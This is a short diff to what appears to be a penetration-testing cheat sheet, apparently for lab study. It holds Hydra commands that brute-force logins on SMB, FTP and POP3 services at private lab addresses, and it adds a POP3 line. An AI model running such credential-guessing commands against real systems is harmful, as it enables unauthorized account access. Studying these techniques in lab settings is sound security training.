@@ -22,12 +22,13 @@ hydra -L user.list -P password.list smb://10.129.42.197
 ```
 # ftp
 ```
-hydra -l simon -P pw.txt -s 2121 ftp://10.129.201.127
+hydra -l luser -P pw.txt -s 2121 ftp://10.129.201.127
 hydra -v -L user.lst -P word.lst -e nsr fileserver.snakeoil.net ftp
 ```
-
-
-
+# pop3
+```
+hydra -l luser -P wordlist pop3://10.129.181.208
+```
 
 
 
